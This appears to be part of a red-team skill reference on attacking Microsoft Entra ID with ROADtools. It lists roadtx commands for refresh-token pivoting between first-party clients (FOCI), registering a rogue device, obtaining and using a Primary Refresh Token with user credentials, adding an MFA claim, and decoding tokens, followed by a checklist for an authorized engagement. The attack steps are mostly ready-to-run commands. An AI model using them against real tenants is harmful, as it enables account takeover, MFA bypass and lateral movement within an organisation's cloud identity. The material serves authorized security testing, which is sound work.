# attacking-entra-id-with-roadtools — 详细参考（由 SKILL.md 拆分）

### Step 6: Exchange refresh tokens across resources (FOCI pivot)

A FOCI refresh token obtained for one first-party client can be redeemed for another resource without re-auth.

```bash
# Convert the stored refresh token to an Azure Resource Manager token
roadtx refreshtokento -r azrm

# Convert to a scoped Graph token via the Teams client
roadtx refreshtokento -c msteams -r msgraph

# Find which first-party clients hold a given scope
roadtx getscope -s https://graph.microsoft.com/mail.read --foci
```

### Step 7: Device registration and PRT-based SSO

```bash
# Register a (virtual) device to the tenant
roadtx device -n redteam-device

# Request a PRT using the device cert/key and user creds
roadtx prt -u user@tenant.com -p 'Password123!' --key-pem redteam-device.key --cert-pem redteam-device.pem

# Use the PRT to authenticate a client to a resource (SSO-grade)
roadtx prtauth -c msteams -r msgraph

# Enrich a PRT with an interactive MFA claim
roadtx prtenrich -u user@tenant.com
```

### Step 8: Inspect tokens

```bash
# Decode and print claims of the stored / a supplied token
roadtx describe -t <JWT>
roadtx describe < .roadtools_auth | jq .
```

## Tools and Resources

| Tool | Purpose | Primary Source |
|------|---------|----------------|
| ROADtools (repo) | Toolkit overview + wiki | https://github.com/dirkjanm/ROADtools |
| ROADrecon wiki | Auth/gather/gui/plugin usage | https://github.com/dirkjanm/ROADtools/wiki/Getting-started-with-ROADrecon |
| roadtx wiki | Token exchange + PRT/device flows | https://github.com/dirkjanm/ROADtools/wiki/ROADtools-Token-eXchange-(roadtx) |
| BloodHound CE | Graph analysis of exported Entra data | https://github.com/SpecterOps/BloodHound |
| Microsoft identity platform | Token/flow reference | https://learn.microsoft.com/entra/identity-platform/ |

## Validation Criteria

- [ ] Authenticated to the target tenant via an authorized flow; `.roadtools_auth` created.
- [ ] Directory gathered into `roadrecon.db` (with `--mfa` where role allows).
- [ ] GUI explored; users, groups, roles, apps, CA policies reviewed.
- [ ] CA-policy and BloodHound plugins executed; data exported.
- [ ] Tokens acquired with roadtx for at least one resource.
- [ ] Refresh-token exchange to a second resource demonstrated (FOCI pivot).
- [ ] Device registered and PRT-based SSO demonstrated (where in scope).
- [ ] Token claims inspected with `roadtx describe`.
- [ ] Findings and access documented for the engagement report.
